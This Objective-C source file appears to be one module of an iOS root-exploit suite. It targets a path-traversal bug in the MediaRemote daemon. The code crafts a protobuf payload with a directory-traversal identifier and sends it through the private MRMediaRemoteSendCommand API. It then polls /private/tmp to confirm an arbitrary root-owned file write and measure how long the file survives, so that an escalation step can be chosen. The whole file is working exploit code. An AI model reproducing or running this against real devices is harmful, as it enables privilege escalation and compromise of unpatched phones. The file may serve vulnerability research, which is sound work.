// ---------------------------------------------------------------------------
// CVE-2026-43723 - MediaRemote path traversal: mediaremoted (uid 0) writes the
// playback-session marker to a path taken from the session data WITHOUT
// validation.  Public PoC (rooootdev "dotdot.m"): MRMediaRemoteSendCommand(136,
// @{kMRMediaRemoteOptionPlaybackSessionData: <protobuf field1=marker,
// field2=identifier-with-traversal>}).  Unpatched on 26.2b1 (fixed in 26.6/27.x).
//
// The daemon's cleanup deletes the file ~50 ms after the write, so this module
// MEASURES the primitive on this build instead of assuming it: it sends the
// command, polls for the file, reports uid/gid/mode/size and what can be read,
// and reports the survival window.  Those numbers decide the escalation step
// (a persistent root-owned artifact vs a transient write).
// ---------------------------------------------------------------------------
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#import <time.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

static NSData *pb_field(int field, NSData *payload) {
    uint8_t tag = (uint8_t)((field << 3) | 2);
    NSMutableData *d = [NSMutableData dataWithBytes:&tag length:1];
    uint64_t len = payload.length;
    while (len >= 0x80) { uint8_t b = (uint8_t)((len & 0x7f) | 0x80); [d appendBytes:&b length:1]; len >>= 7; }
    uint8_t b = (uint8_t)len; [d appendBytes:&b length:1];
    [d appendData:payload];
    return d;
}

NSString *ModMediaRemoteDD(void) {
    AvePost(@"43723 start: MediaRemote traversal write (public dotdot recipe)");

    void *fw = dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote",
                      RTLD_NOW);
    if (!fw) {
        AvePost(@"43723: dlopen MediaRemote FAILED (sandbox?)");
        return @"43723: MediaRemote.framework not loadable";
    }
    typedef void (^res)(NSDictionary *);
    typedef void (*send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, res);
    send_fn fn = (send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
    if (!fn) {
        AvePost(@"43723: MRMediaRemoteSendCommand not found in this build");
        return @"43723: symbol missing on this build";
    }
    AvePost(@"43723: framework loaded, symbol found");

    // the target inside the app container's view: /private/tmp is the daemon's
    // write destination after 6 traversals from its own cwd (as published)
    NSString *name = [NSString stringWithFormat:@"rs43723_%ld", (long)time(NULL)];
    NSString *target = [NSString stringWithFormat:@"/private/tmp/%@", name];
    NSString *targetAbs = target;   // the same path, sent verbatim as the identifier
    NSString *identifier = [NSString stringWithFormat:@"../../../../../../../private/tmp/%@", name];

    // marker: recognisable bytes, so a read-back is unambiguous
    NSString *mark = [NSString stringWithFormat:@"rootsuite-43723-%ld\n", (long)time(NULL)];
    NSData *marker = [mark dataUsingEncoding:NSUTF8StringEncoding];

    NSMutableData *proto = [NSMutableData dataWithData:pb_field(1, marker)];
    [proto appendData:pb_field(2, [[identifier dataUsingEncoding:NSUTF8StringEncoding] copy])];

    struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);
    // the public PoC ignores the completion; on iOS the daemon answers with an error
    // (mediaremoted verifies com.apple.mediaremote.send-commands since 15.4-class
    // builds), so the RESPONSE is the measurement that separates "denied" from
    // "accepted but wrote elsewhere".
    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
       dispatch_get_main_queue(), ^(NSDictionary *r) {
        if (r.count)
            AvePost([NSString stringWithFormat:@"43723: command response: %@", r]);
        else
            AvePost(@"43723: command response: (empty) - the daemon took the message silently");
    });
    AvePost([NSString stringWithFormat:@"43723: command 136 sent, identifier=%@", identifier]);

    // reachability probe: GetNowPlayingInfo answers from the same daemon.
    typedef void (*gni_fn)(dispatch_queue_t, void (^)(CFDictionaryRef));
    gni_fn gni = (gni_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteGetNowPlayingInfo");
    if (gni) {
        gni(dispatch_get_main_queue(), ^(CFDictionaryRef info) {
            AvePost([NSString stringWithFormat:@"43723: GetNowPlayingInfo -> %@",
                     info ? (__bridge NSDictionary *)info : @"(nil answer)"]);
        });
    } else {
        AvePost(@"43723: MRMediaRemoteGetNowPlayingInfo not exported on this build");
    }

    // second send: the identifier verbatim as an absolute path - if this build's
    // daemon no longer traverses, THIS is the one that writes.
    NSMutableData *proto2 = [NSMutableData dataWithData:pb_field(1, marker)];
    [proto2 appendData:pb_field(2, [[targetAbs dataUsingEncoding:NSUTF8StringEncoding] copy])];
    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto2 },
       dispatch_get_main_queue(), ^(NSDictionary *r) {
        if (r.count)
            AvePost([NSString stringWithFormat:@"43723: absolute-identifier response: %@", r]);
        else
            AvePost(@"43723: absolute-identifier response: (empty)");
    });
    AvePost([NSString stringWithFormat:@"43723: absolute-identifier sent: %@", targetAbs]);

    // poll: appearance, ownership, readability, survival - BOTH the traversal target
    // and the plain absolute path (in case the daemon no longer traverses on this
    // build and takes the identifier verbatim).
    BOOL appeared = NO; int appeared_ms = -1; int gone_ms = -1;
    struct stat st; memset(&st, 0, sizeof st);
    NSString *readback = nil;
    for (int i = 0; i < 400; i++) {          // up to ~2 s of polling
        if (stat(target.UTF8String, &st) == 0 || stat(targetAbs.UTF8String, &st) == 0) {
            if (!appeared) {
                appeared = YES;
                struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
                appeared_ms = (int)((now.tv_sec - t0.tv_sec) * 1000.0 +
                                    (now.tv_nsec - t0.tv_nsec) / 1e6);
                AvePost([NSString stringWithFormat:@"43723: FILE APPEARED at %@ after %d ms: "
                         @"uid=%d gid=%d mode=%04o size=%lld", target, appeared_ms,
                         st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size]);
                int fd = open(target.UTF8String, O_RDONLY);
                if (fd >= 0) {
                    char buf[256] = {0};
                    ssize_t n = read(fd, buf, sizeof(buf) - 1);
                    close(fd);
                    if (n > 0) { buf[n] = 0; readback = [NSString stringWithUTF8String:buf];
                        AvePost([NSString stringWithFormat:@"43723: read back: %@", readback]); }
                } else {
                    AvePost([NSString stringWithFormat:@"43723: open for read failed errno=%d", errno]);
                }
                if (st.st_uid == 0)
                    AvePost(@"43723: written by uid 0 - arbitrary ROOT write confirmed");
                else
                    AvePost([NSString stringWithFormat:@"43723: written by uid=%d - NOT root", st.st_uid]);
            }
        } else if (appeared && errno == ENOENT) {
            struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
            gone_ms = (int)((now.tv_sec - t0.tv_sec) * 1000.0 +
                            (now.tv_nsec - t0.tv_nsec) / 1e6);
            AvePost([NSString stringWithFormat:@"43723: file deleted (cleanup) after %d ms total", gone_ms]);
            break;
        }
        struct timespec slp = {0, 5000000}; nanosleep(&slp, NULL);   // 5 ms
    }

    if (!appeared) {
        AvePost(@"43723: no file appeared - either unreachable from the container or the "
                 @"command shape differs on this build");
        return @"43723: no write observed (reachability/measurement failed)";
    }
    NSString *v = [NSString stringWithFormat:@"43723: root write %@ (uid=%d, mode=%04o, "
                   @"survived %@, read back %@)", appeared ? @"OBSERVED" : @"absent",
                   st.st_uid, st.st_mode & 07777,
                   gone_ms > appeared_ms ? @"timed" : @"window open",
                   readback ?: @"unreadable"];
    AvePost(v);
    return v;
}